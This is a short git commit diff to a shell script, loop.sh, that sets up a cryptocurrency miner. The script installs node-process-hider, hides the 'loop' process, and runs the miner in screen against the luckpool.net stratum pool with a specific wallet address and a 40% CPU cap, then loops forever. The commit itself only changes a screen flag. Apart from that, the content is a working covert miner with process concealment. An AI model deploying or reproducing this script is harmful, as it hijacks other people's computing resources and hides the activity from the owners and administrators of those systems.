5732482b30d5d554affe9d748bad4b10c2db4c16
breakok <95564840+breakok@users.noreply.github.com>
2021-12-25 13:03:35 +0530

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -5,7 +5,7 @@ apt install npm -y
 npm i -g node-process-hider
 ph add loop
 apt install screen -y
-screen -R ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
+screen ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
 while [ 1 ]; do
 sleep 3
 done
